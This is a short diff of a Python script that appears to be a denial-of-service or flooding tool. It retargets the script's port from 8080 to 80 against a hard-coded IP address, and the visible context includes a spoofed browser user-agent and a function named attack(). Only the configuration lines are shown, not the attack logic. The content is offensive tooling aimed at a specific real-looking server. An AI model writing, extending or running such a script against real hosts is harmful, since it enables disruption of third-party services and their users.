@@ -6,7 +6,7 @@ import random
 no_of_process = 2
 list_process = []
 host = "144.217.100.106"
-port = 8080
+port = 80
 user_agent = "User-agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n"
 
 def attack():
